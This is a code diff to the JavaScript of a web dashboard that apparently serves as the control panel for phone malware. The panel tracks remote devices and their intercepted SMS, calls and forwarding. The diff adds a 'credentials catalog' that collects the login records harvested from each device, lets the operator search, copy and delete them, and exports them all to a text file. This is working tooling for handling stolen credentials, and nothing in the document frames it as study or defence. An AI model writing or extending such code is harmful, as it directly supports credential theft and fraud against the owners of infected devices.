-            const hint = card.querySelector('.device-top .device-name + div');
+            const hint = card.querySelector('.expand-hint');
             if (hint) {
-                hint.textContent = state.expandedDevices.get(devId) ? '▲ Click to collapse' : '▼ Click to expand';
+                hint.innerHTML = `<i class="fas fa-chevron-down"></i> ${state.expandedDevices.get(devId) ? 'Click to collapse' : 'Click to expand'}`;
             }
             if (state.expandedDevices.get(devId)) {
                 setTimeout(() => {
@@ -625,22 +728,24 @@ function setTab(devId, tab) {
             return;
         }
         
-        const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
+        // Update action buttons
+        const buttons = card.querySelectorAll('.action-btn-premium');
         const activeTab = state.activeTabs.get(devId);
         
         buttons.forEach(btn => {
-            btn.className = 'sub-btn';
+            btn.className = 'action-btn-premium';
             const text = btn.textContent.trim();
-            if (text.includes('💬') && activeTab === 'sms') btn.classList.add('active-sms');
-            else if (text.includes('🔑') && activeTab === 'login') btn.classList.add('active-login');
-            else if (text.includes('📞') && activeTab === 'call') btn.classList.add('active-call');
-            else if (text.includes('✉️') && activeTab === 'sendsms') btn.classList.add('active-sendsms');
-            else if (text.includes('🔀') && activeTab === 'fwd') btn.classList.add('active-fwd');
-            else if (text.includes('💾') && activeTab === 'backup') btn.classList.add('active-backup');
-            else if (text.includes('🗑️') && activeTab === 'delete') btn.classList.add('active-delete');
+            if (text.includes('SMS') && activeTab === 'sms') btn.classList.add('active-sms');
+            else if (text.includes('Login') && activeTab === 'login') btn.classList.add('active-login');
+            else if (text.includes('Call') && activeTab === 'call') btn.classList.add('active-call');
+            else if (text.includes('Send') && activeTab === 'sendsms') btn.classList.add('active-sendsms');
+            else if (text.includes('Forward') && activeTab === 'fwd') btn.classList.add('active-fwd');
+            else if (text.includes('Backup') && activeTab === 'backup') btn.classList.add('active-backup');
+            else if (text.includes('Delete') && activeTab === 'delete') btn.classList.add('active-delete');
         });
         
-        const sections = card.querySelectorAll('.section-box');
+        // Update sections
+        const sections = card.querySelectorAll('.section-premium');
         sections.forEach(sec => sec.classList.remove('active'));
         
         if (activeTab) {
@@ -711,11 +816,11 @@ function loadPrevDevices() {
 // ============================================================
 function checkDeviceStatus(devId) {
     if (!devId) return;
-    const statusEl = document.getElementById(`status-${devId}`);
+    const statusEl = document.querySelector(`#card-${devId} .status-badge-premium`);
     if (!statusEl) return;
     
-    statusEl.textContent = '⏳ Checking...';
-    statusEl.className = 'device-status checking';
+    statusEl.className = 'status-badge-premium checking';
+    statusEl.innerHTML = '<span class="status-dot"></span> Checking...';
     
     db.ref(`user_data/${devId}`).once('value').then(snap => {
         if (snap.exists()) {
@@ -730,35 +835,38 @@ function checkDeviceStatus(devId) {
             updateDeviceStatusUI(devId, finalStatus, lastSeen);
             showToast(`📱 ${devId}: ${finalStatus ? '🟢 Online' : '🔴 Offline'}`, finalStatus ? 'success' : 'error');
         } else {
-            statusEl.textContent = '❌ Not Found';
-            statusEl.className = 'device-status offline';
+            statusEl.className = 'status-badge-premium offline';
+            statusEl.innerHTML = '<span class="status-dot"></span> Not Found';
             showToast('❌ Device not found', 'error');
         }
     }).catch(() => {
-        statusEl.textContent = '❌ Error';
-        statusEl.className = 'device-status offline';
+        statusEl.className = 'status-badge-premium offline';
+        statusEl.innerHTML = '<span class="status-dot"></span> Error';
         showToast('❌ Error checking status', 'error');
     });
 }
 
 function updateDeviceStatusUI(devId, isOnline, lastSeen) {
-    const statusEl = document.getElementById(`status-${devId}`);
-    const timeEl = document.getElementById(`time-${devId}`);
+    const statusEl = document.querySelector(`#card-${devId} .status-badge-premium`);
+    const timeEl = document.querySelector(`#card-${devId} .last-seen-premium`);
+    
     if (statusEl) {
-        statusEl.textContent = isOnline ? '● Online' : '● Offline';
-        statusEl.className = `device-status ${isOnline ? 'online' : 'offline'}`;
+        statusEl.className = `status-badge-premium ${isOnline ? 'online' : 'offline'}`;
+        statusEl.innerHTML = `<span class="status-dot"></span> ${isOnline ? 'Online' : 'Offline'}`;
     }
+    
     if (timeEl) {
+        const dateStr = lastSeen ? new Date(lastSeen).toLocaleDateString() : '';
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
-        timeEl.textContent = `⏱ ${timeStr}`;
+        timeEl.innerHTML = `<i class="far fa-clock"></i> ${dateStr ? dateStr + ' ' : ''}${timeStr}`;
     }
 }
 
 // ============================================================
-// TOGGLE PANEL
+// TOGGLE PANEL - WITH CREDENTIALS
 // ============================================================
 function togglePanel(panel) {
-    const panels = ['devices', 'sms', 'backup', 'analytics'];
+    const panels = ['devices', 'sms', 'credentials', 'backup', 'analytics'];
     
     panels.forEach(p => {
         if (p !== panel) {
@@ -782,6 +890,7 @@ function togglePanel(panel) {
             panelEl.classList.add('active');
             if (nav) nav.classList.add('active');
             if (mobileNav) mobileNav.classList.add('active');
+            if (panel === 'credentials') renderCredentialsCatalog();
             performRender();
         } else {
             panelEl.classList.remove('active');
@@ -1653,10 +1762,415 @@ function escapeHtml(text) {
 }
 
 // ============================================================
+// CREDENTIALS CATALOG - COMPLETE
+// ============================================================
+
+// ============================================================
+// RENDER CREDENTIALS CATALOG
+// ============================================================
+function renderCredentialsCatalog() {
+    const grid = document.getElementById('credsGrid');
+    const tabs = document.getElementById('credDeviceTabs');
+    const pagination = document.getElementById('credPagination');
+    
+    if (!grid) return;
+    
+    // Collect all credentials
+    const loginData = state.data.login || {};
+    const devices = state.data.user_data || {};
+    
+    state.credCatalogData = [];
+    let totalCreds = 0;
+    let deviceWithCreds = 0;
+    
+    Object.keys(loginData).forEach(devId => {
+        const creds = loginData[devId];
+        if (creds && Object.keys(creds).length > 0) {
+            deviceWithCreds++;
+            const credList = [];
+            Object.keys(creds).forEach(key => {
+                credList.push({ key, ...creds[key] });
+            });
+            credList.reverse();
+            state.credCatalogData.push({
+                deviceId: devId,
+                serial: state.deviceSerialMap.get(devId) || 0,
+                deviceInfo: devices[devId] || {},
+                credentials: credList,
+                count: credList.length
+            });
+            totalCreds += credList.length;
+        }
+    });
+    
+    state.credCatalogData.sort((a, b) => b.serial - a.serial);
+    
+    // Update counts
+    const totalEl = document.getElementById('catalogTotalCreds');
+    const devicesEl = document.getElementById('catalogTotalDevices');
+    if (totalEl) totalEl.textContent = totalCreds;
+    if (devicesEl) devicesEl.textContent = deviceWithCreds;
+    
+    // Build tabs
+    buildCredDeviceTabs(tabs);
+    
+    // Apply filters
+    let filteredData = applyCredFilters(state.credCatalogData);
+    
+    // Paginate
+    const totalPages = Math.ceil(filteredData.length / CREDS_PER_PAGE);
+    if (state.credCurrentPage > totalPages) state.credCurrentPage = Math.max(1, totalPages);
+    const start = (state.credCurrentPage - 1) * CREDS_PER_PAGE;
+    const end = Math.min(start + CREDS_PER_PAGE, filteredData.length);
+    const pageData = filteredData.slice(start, end);
+    
+    // Render grid
+    if (pageData.length === 0) {
+        grid.innerHTML = `
+            <div class="no-creds" style="grid-column:1/-1;">
+                <div class="no-creds-icon"><i class="fas fa-key"></i></div>
+                <h4>No Credentials Found</h4>
+                <p>${state.credSearchQuery ? 'Try adjusting your search' : 'Credentials will appear here when devices save them'}</p>
+            </div>
+        `;
+    } else {
+        grid.innerHTML = pageData.map(item => buildCredCard(item)).join('');
+    }
+    
+    renderCredPagination(pagination, totalPages, filteredData.length);
+}
+
+// ============================================================
+// BUILD CREDENTIAL DEVICE TABS
+// ============================================================
+function buildCredDeviceTabs(container) {
+    if (!container) return;
+    
+    let html = `<button class="filter-tab active" onclick="filterCreds('all')" data-filter="all">
+        <i class="fas fa-list"></i> All <span class="tab-count">${state.credCatalogData.length}</span>
+    </button>`;
+    
+    html += `<button class="filter-tab" onclick="filterCreds('hasCreds')" data-filter="hasCreds">
+        <i class="fas fa-check-circle"></i> With Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count > 0).length}</span>
+    </button>`;
+    
+    html += `<button class="filter-tab" onclick="filterCreds('noCreds')" data-filter="noCreds">
+        <i class="fas fa-circle"></i> No Creds <span class="tab-count">${state.credCatalogData.filter(d => d.count === 0).length}</span>
+    </button>`;
+    
+    const topDevices = [...state.credCatalogData]
+        .filter(d => d.count > 0)
+        .sort((a, b) => b.count - a.count)
+        .slice(0, 5);
+    
+    topDevices.forEach(item => {
+        const name = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
+        html += `<button class="filter-tab" onclick="filterCredsByDevice('${item.deviceId}')" data-filter="${item.deviceId}">
+            📱 ${escapeHtml(name.substring(0, 10))} <span class="tab-count">${item.count}</span>
+        </button>`;
+    });
+    
+    container.innerHTML = html;
+}
+
+// ============================================================
+// BUILD CREDENTIAL CARD
+// ============================================================
+function buildCredCard(item) {
+    const deviceName = item.deviceInfo.d_name || item.deviceInfo.device_name || item.deviceId;
+    const serial = item.serial || 0;
+    
+    let credsHtml = item.credentials.map((cred, idx) => {
+        let fieldsHtml = '';
+        for (let k in cred) {
+            if (k === 'key' || k === 'timestamp') continue;
+            const value = cred[k] || 'N/A';
+            const fieldId = `cred-${item.deviceId}-${idx}-${k}`;
+            fieldsHtml += `
+                <div class="cred-field">
+                    <span class="field-label">${escapeHtml(k)}</span>
+                    <span class="field-value">
+                        <span id="${fieldId}">${escapeHtml(String(value))}</span>
+                        <button class="copy-field-btn" onclick="copyField('${fieldId}')">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </span>
+                </div>
+            `;
+        }
+        
+        return `
+            <div class="cred-item">
+                <div class="cred-item-header">
+                    <span class="record-num">#${idx + 1}</span>
+                    <div class="cred-actions">
+                        <button onclick="copyAllCreds('${item.deviceId}', ${idx})" title="Copy All">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <button class="danger" onclick="deleteSingleCred('${item.deviceId}', ${idx})" title="Delete">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </div>
+                </div>
+                <div class="cred-fields">${fieldsHtml}</div>
+            </div>
+        `;
+    }).join('');
+    
+    return `
+        <div class="cred-card" data-device="${item.deviceId}">
+            <div class="cred-card-header">
+                <div class="device-name-tag">
+                    <span class="dev-icon"><i class="fas fa-mobile-alt"></i></span>
+                    <span class="dev-name">${escapeHtml(deviceName)}</span>
+                    ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
+                </div>
+                <span class="cred-count-badge">
+                    <i class="fas fa-key"></i> ${item.count}
+                </span>
+            </div>
+            <div class="cred-card-body">
+                ${credsHtml}
+            </div>
+        </div>
+    `;
+}
+
+// ============================================================
+// APPLY CREDENTIAL FILTERS
+// ============================================================
+function applyCredFilters(data) {
+    let filtered = [...data];
+    
+    if (state.credFilter === 'hasCreds') {
+        filtered = filtered.filter(d => d.count > 0);
+    } else if (state.credFilter === 'noCreds') {
+        filtered = filtered.filter(d => d.count === 0);
+    } else if (state.credFilter !== 'all') {
+        filtered = filtered.filter(d => d.deviceId === state.credFilter);
+    }
+    
+    if (state.credSearchQuery) {
+        const query = state.credSearchQuery.toLowerCase();
+        filtered = filtered.filter(item => {
+            const deviceMatch = item.deviceId.toLowerCase().includes(query) ||
+                               (item.deviceInfo.d_name || '').toLowerCase().includes(query) ||
+                               (item.deviceInfo.device_name || '').toLowerCase().includes(query);
+            
+            if (deviceMatch) return true;
+            
+            return item.credentials.some(cred => {
+                for (let k in cred) {
+                    if (k === 'key' || k === 'timestamp') continue;
+                    const value = String(cred[k] || '').toLowerCase();
+                    if (value.includes(query)) return true;
+                }
+                return false;
+            });
+        });
+    }
+    
+    return filtered;
+}
+
+// ============================================================
+// CREDENTIAL FILTER FUNCTIONS
+// ============================================================
+function filterCreds(filter) {
+    state.credFilter = filter;
+    state.credCurrentPage = 1;
+    
+    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    
+    const btnMap = {
+        'all': 'credFilterAll',
+        'hasCreds': 'credFilterHasCreds',
+        'noCreds': 'credFilterNoCreds'
+    };
+    
+    if (btnMap[filter]) {
+        const btn = document.getElementById(btnMap[filter]);
+        if (btn) btn.classList.add('active');
+    }
+    
+    renderCredentialsCatalog();
+}
+
+function filterCredsByDevice(deviceId) {
+    state.credFilter = deviceId;
+    state.credCurrentPage = 1;
+    
+    document.querySelectorAll('.catalog-toolbar .toolbar-btn').forEach(btn => {
+        btn.classList.remove('active');
+    });
+    
+    renderCredentialsCatalog();
+}
+
+// ============================================================
+// CREDENTIAL SEARCH
+// ============================================================
+let credSearchTimeout = null;
+
+function searchCredentials(query) {
+    if (credSearchTimeout) {
+        clearTimeout(credSearchTimeout);
+    }
+    credSearchTimeout = setTimeout(() => {
+        state.credSearchQuery = query.toLowerCase().trim();
+        state.credCurrentPage = 1;
+        renderCredentialsCatalog();
+        credSearchTimeout = null;
+    }, 300);
+}
+
+// ============================================================
+// CREDENTIAL PAGINATION
+// ============================================================
+function renderCredPagination(container, totalPages, totalItems) {
+    if (!container) return;
+    
+    if (totalPages <= 1) {
+        container.innerHTML = '';
+        return;
+    }
+    
+    let html = `
+        <button onclick="credGoToPage(${state.credCurrentPage - 1})" ${state.credCurrentPage <= 1 ? 'disabled' : ''}>
+            <i class="fas fa-chevron-left"></i>
+        </button>
+    `;
+    
+    const startPage = Math.max(1, state.credCurrentPage - 2);
+    const endPage = Math.min(totalPages, state.credCurrentPage + 2);
+    
+    if (startPage > 1) {
+        html += `<button onclick="credGoToPage(1)">1</button>`;
+        if (startPage > 2) html += `<button disabled>...</button>`;
+    }
+    
+    for (let i = startPage; i <= endPage; i++) {
+        html += `<button class="${i === state.credCurrentPage ? 'active' : ''}" onclick="credGoToPage(${i})">${i}</button>`;
+    }
+    
+    if (endPage < totalPages) {
+        if (endPage < totalPages - 1) html += `<button disabled>...</button>`;
+        html += `<button onclick="credGoToPage(${totalPages})">${totalPages}</button>`;
+    }
+    
+    html += `
+        <button onclick="credGoToPage(${state.credCurrentPage + 1})" ${state.credCurrentPage >= totalPages ? 'disabled' : ''}>
+            <i class="fas fa-chevron-right"></i>
+        </button>
+        <span class="page-info">${totalItems} items</span>
+    `;
+    
+    container.innerHTML = html;
+}
+
+function credGoToPage(page) {
+    const filtered = applyCredFilters(state.credCatalogData);
+    const totalPages = Math.ceil(filtered.length / CREDS_PER_PAGE);
+    if (page < 1 || page > totalPages) return;
+    state.credCurrentPage = page;
+    renderCredentialsCatalog();
+}
+
+// ============================================================
+// CREDENTIAL UTILITY FUNCTIONS
+// ============================================================
+function copyAllCreds(deviceId, index) {
+    const data = state.credCatalogData.find(d => d.deviceId === deviceId);
+    if (!data || !data.credentials[index]) return;
+    
+    const cred = data.credentials[index];
+    let text = '';
+    for (let k in cred) {
+        if (k === 'key' || k === 'timestamp') continue;
+        text += `${k}: ${cred[k]}\n`;
+    }
+    
+    navigator.clipboard.writeText(text).then(() => {
+        showToast('📋 All credentials copied!', 'success');
+    }).catch(() => {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        ta.remove();
+        showToast('📋 All credentials copied!', 'success');
+    });
+}
+
+function deleteSingleCred(deviceId, index) {
+    const password = prompt('🔐 Enter Password to delete this credential:');
+    if (password === null) return;
+    if (password !== DELETE_PASSWORD) {
+        showToast('❌ Incorrect Password!', 'error');
+        return;
+    }
+    
+    const data = state.credCatalogData.find(d => d.deviceId === deviceId);
+    if (!data || !data.credentials[index]) return;
+    
+    const cred = data.credentials[index];
+    const key = cred.key;
+    
+    if (!confirm(`Delete credential for ${deviceId}?`)) return;
+    
+    db.ref(`login/${deviceId}/${key}`).remove().then(() => {
+        showToast('✅ Credential deleted!', 'success');
+        setTimeout(() => {
+            renderCredentialsCatalog();
+            performRender();
+        }, 300);
+    }).catch(err => {
+        showToast('❌ Error: ' + err.message, 'error');
+    });
+}
+
+function exportCredentials() {
+    if (state.credCatalogData.length === 0) {
+        showToast('📭 No credentials to export', 'info');
+        return;
+    }
+    
+    let text = '=== CREDENTIALS EXPORT ===\n';
+    text += `Exported: ${new Date().toLocaleString()}\n\n`;
+    
+    state.credCatalogData.forEach(item => {
+        text += `\n📱 Device: ${item.deviceId}\n`;
+        text += `   Serial: ${item.serial || 'N/A'}\n`;
+        text += `   ${'-'.repeat(40)}\n`;
+        
+        item.credentials.forEach((cred, idx) => {
+            text += `   Record #${idx + 1}:\n`;
+            for (let k in cred) {
+                if (k === 'key' || k === 'timestamp') continue;
+                text += `      ${k}: ${cred[k]}\n`;
+            }
+            text += `   ${'-'.repeat(30)}\n`;
+        });
+    });
+    
+    const blob = new Blob([text], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `credentials_export_${Date.now()}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    
+    showToast('📥 Credentials exported!', 'success');
+}
+
+// ============================================================
 // MOBILE ENHANCEMENTS
 // ============================================================
 
-// ===== FAB MENU =====
 function toggleFabMenu() {
     const main = document.querySelector('.fab-main');
     const actions = document.getElementById('fabActions');
@@ -1665,14 +2179,10 @@ function toggleFabMenu() {
 }
 
 function scrollToTop() {
-    window.scrollTo({
-        top: 0,
-        behavior: 'smooth'
-    });
+    window.scrollTo({ top: 0, behavior: 'smooth' });
     toggleFabMenu();
 }
 
-// ===== BOTTOM SHEET =====
 function openBottomSheet(content) {
     const overlay = document.getElementById('bottomSheetOverlay');
     const contentEl = document.getElementById('bottomSheetContent');
@@ -1729,8 +2239,6 @@ function showDeviceInBottomSheet(devId) {
 
 // ===== PULL TO REFRESH =====
 let pullStartY = 0;
-let pullMoveY = 0;
-let isPulling = false;
 let refreshIndicator = null;
 
 function initPullToRefresh() {
@@ -1740,9 +2248,7 @@ function initPullToRefresh() {
     refreshIndicator = document.createElement('div');
     refreshIndicator.className = 'pull-to-refresh';
     refreshIndicator.innerHTML = `
-        <div class="pull-icon">
-            <i class="fas fa-chevron-down"></i>
-        </div>
+        <div class="pull-icon"><i class="fas fa-chevron-down"></i></div>
         <span class="pull-text">Pull to refresh</span>
     `;
     container.parentNode.insertBefore(refreshIndicator, container);
@@ -1765,11 +2271,9 @@ function initPullToRefresh() {
         
         if (diff > 0 && window.scrollY === 0) {
             e.preventDefault();
-            const pullPercent = Math.min(diff / 80, 1);
             if (refreshIndicator) {
                 refreshIndicator.style.transform = `translateY(${Math.min(diff, 80)}px)`;
-                
-                if (pullPercent > 0.8) {
+                if (diff > 60) {
                     refreshIndicator.querySelector('.pull-text').textContent = 'Release to refresh';
                     refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-chevron-up';
                     refreshIndicator.classList.add('ready');
@@ -1785,18 +2289,16 @@ function initPullToRefresh() {
     container.addEventListener('touchend', function(e) {
         if (!isDragging) return;
         isDragging = false;
-        
         if (!refreshIndicator) return;
+        
         const diff = parseInt(refreshIndicator.style.transform.replace('translateY(', '')) || 0;
         
         if (diff > 60) {
             refreshIndicator.querySelector('.pull-text').textContent = 'Refreshing...';
             refreshIndicator.querySelector('.pull-icon i').className = 'fas fa-spinner fa-spin';
             refreshIndicator.classList.add('refreshing');
-            
             performRender();
             showToast('🔄 Refreshed!', 'success', 1500);
-            
             setTimeout(() => {
                 refreshIndicator.classList.remove('active', 'ready', 'refreshing');
                 refreshIndicator.style.transform = 'translateY(0)';
@@ -1821,12 +2323,9 @@ function initSwipeToDelete() {
     if (!container) return;
     
     container.addEventListener('touchstart', function(e) {
-        const card = e.target.closest('.device-card-luxury');
+        const card = e.target.closest('.device-card-premium');
         if (!card) return;
-        
-        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) {
-            return;
-        }
+        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
         
         swipeStartX = e.touches[0].clientX;
         swipeTarget = card;
@@ -1836,7 +2335,6 @@ function initSwipeToDelete() {
     
     container.addEventListener('touchmove', function(e) {
         if (!isSwiping || !swipeTarget) return;
-        
         swipeCurrentX = e.touches[0].clientX;
         const diff = swipeCurrentX - swipeStartX;
         
@@ -1844,7 +2342,6 @@ function initSwipeToDelete() {
             e.preventDefault();
             const translateX = Math.max(diff, -120);
             swipeTarget.style.transform = `translateX(${translateX}px)`;
-            
             const deleteHint = swipeTarget.querySelector('.swipe-delete-hint');
             if (deleteHint) {
                 deleteHint.style.opacity = Math.min(Math.abs(translateX) / 120, 1);
@@ -1855,7 +2352,6 @@ function initSwipeToDelete() {
     container.addEventListener('touchend', function(e) {
         if (!isSwiping || !swipeTarget) return;
         isSwiping = false;
-        
         const diff = swipeCurrentX - swipeStartX;
         swipeTarget.style.transition = 'transform 0.3s ease';
         
@@ -1864,30 +2360,20 @@ function initSwipeToDelete() {
             if (devId) {
                 swipeTarget.style.transform = 'translateX(-100%)';
                 setTimeout(() => {
-                    showDeleteSwipeDialog(devId);
+                    if (confirm(`🗑️ Delete all data for device ${devId}?`)) {
+                        deleteDeviceSms(devId);
+                        setTimeout(() => deleteDeviceCredentials(devId), 500);
+                    } else {
+                        const card = document.getElementById(`card-${devId}`);
+                        if (card) card.style.transform = 'translateX(0)';
+                    }
                 }, 300);
             }
         } else {
             swipeTarget.style.transform = 'translateX(0)';
         }
-        
         swipeTarget = null;
     }, { passive: true });
-}
-
-function showDeleteSwipeDialog(devId) {
-    const confirm = window.confirm(`🗑️ Delete all data for device ${devId}?`);
-    if (confirm) {
-        deleteDeviceSms(devId);
-        setTimeout(() => {
-            deleteDeviceCredentials(devId);
-        }, 500);
-    } else {
-        const card = document.getElementById(`card-${devId}`);
-        if (card) {
-            card.style.transform = 'translateX(0)';
-        }
-    }
 }
 
 // ===== LONG PRESS =====
@@ -1899,12 +2385,9 @@ function initLongPress() {
     if (!container) return;
     
     container.addEventListener('touchstart', function(e) {
-        const card = e.target.closest('.device-card-luxury');
+        const card = e.target.closest('.device-card-premium');
         if (!card) return;
-        
-        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) {
-            return;
-        }
+        if (e.target.closest('button') || e.target.closest('input') || e.target.closest('select') || e.target.closest('textarea')) return;
         
         longPressTarget = card;
         longPressTimer = setTimeout(() => {
@@ -1970,7 +2453,15 @@ document.addEventListener('DOMContentLoaded', function() {
         clearBtn.addEventListener('click', clearSearch);
     }
     
-    // Mobile enhancements - only on mobile
+    // Credentials search
+    const credSearchInput = document.getElementById('credSearchInput');
+    if (credSearchInput) {
+        credSearchInput.addEventListener('input', function() {
+            searchCredentials(this.value);
+        });
+    }
+    
+    // Mobile enhancements
     if (window.innerWidth <= 900) {
         setTimeout(() => {
             initPullToRefresh();
@@ -1979,7 +2470,7 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 500);
     }
     
-    // Handle window resize
+    // Resize handler
     let resizeTimer;
     window.addEventListener('resize', function() {
         clearTimeout(resizeTimer);
@@ -2037,3 +2528,11 @@ window.scrollToTop = scrollToTop;
 window.openBottomSheet = openBottomSheet;
 window.closeBottomSheet = closeBottomSheet;
 window.showDeviceInBottomSheet = showDeviceInBottomSheet;
+window.filterCreds = filterCreds;
+window.filterCredsByDevice = filterCredsByDevice;
+window.searchCredentials = searchCredentials;
+window.credGoToPage = credGoToPage;
+window.copyAllCreds = copyAllCreds;
+window.deleteSingleCred = deleteSingleCred;
+window.exportCredentials = exportCredentials;
+window.renderCredentialsCatalog = renderCredentialsCatalog;
